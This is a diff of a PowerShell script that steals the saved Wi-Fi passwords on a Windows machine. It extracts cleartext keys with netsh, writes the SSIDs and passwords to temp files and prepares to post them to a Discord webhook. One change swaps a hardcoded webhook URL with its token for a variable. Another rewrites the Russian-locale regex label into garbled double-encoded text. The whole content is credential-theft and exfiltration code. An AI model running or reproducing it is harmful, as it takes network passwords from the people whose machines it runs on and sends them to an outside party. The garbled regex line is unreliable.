@@ -1,5 +1,5 @@
 $wifissid = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name}} | Format-Table -AutoSize | Out-String
-$wifipass = $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Ñîäåðæèìîå êëþ÷à\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
+$wifipass = $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Ã‘Ã®Ã¤Ã¥Ã°Ã¦Ã¨Ã¬Ã®Ã¥ ÃªÃ«Ã¾Ã·Ã \W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
 
 $wifissid > $env:TEMP/wifi-ssid.txt
 $wifipass > $env:TEMP/wifi-pass.txt
@@ -14,7 +14,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "'https://discord.com/api/webhooks/1117010204882649108/P17xsDKiBxsPNV0G49brrLwtwkHU-haM3iOLQJmp8c9dMQKve_e4vWvR6F966DiiYGOB'"
+$hookurl = "$dc"
 
 $Body = @{
   'username' = $env:username
